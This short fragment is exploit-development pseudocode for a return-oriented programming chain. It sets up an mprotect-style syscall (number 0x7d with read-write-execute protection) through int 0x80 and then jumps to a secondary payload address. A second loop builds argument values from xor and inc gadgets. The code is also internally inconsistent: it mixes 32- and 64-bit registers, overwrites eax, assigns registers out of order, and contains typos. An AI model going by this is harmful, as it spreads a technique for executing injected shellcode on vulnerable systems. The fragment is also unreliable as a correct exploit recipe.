gadget(mov	ecx, 0x0007) + (ROP BASE ADDR + 4)
+ gadget(mov	ebx, 0xffffffff) + (ROP BASE ADDR + 8)
+ gadget(mov	eax, SECONDARY PAYLOAD ADDR) + (ROP BASE ADDR + 12)
+ gadget(mov	rax, 0x7d) + (ROP BASE ADDR + 16)
+ gadget(int	0x80) + (ROP BASE ADDR + 20)
+ SECONDARY PAYLOAD ADDR


for each argument:
	subchain = "xor eax, eax; ret;"
	subchain += int(argument) * "inc; ret;"
	subchain += "move REGISTER, eax; ret;"

